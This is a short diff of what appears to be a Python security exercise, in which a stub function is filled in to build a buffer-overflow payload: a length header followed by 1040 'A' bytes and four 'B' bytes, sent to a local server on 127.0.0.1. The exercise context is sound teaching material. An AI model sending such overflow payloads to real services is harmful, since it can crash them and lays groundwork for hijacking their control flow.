@@ -1,6 +1,6 @@
 import os
 import socket
-
+import struct
 
 HOST = '127.0.0.1'
 PORT = 8000
@@ -21,9 +21,8 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
-
+    crash_message_len = 1044 # The length of our crashing message.
+    return struct.pack('>l', crash_message_len) + (('A'*1040+'B'*4).encode('latin1'))
 
 def main():
     # WARNING: DON'T EDIT THIS FUNCTION!
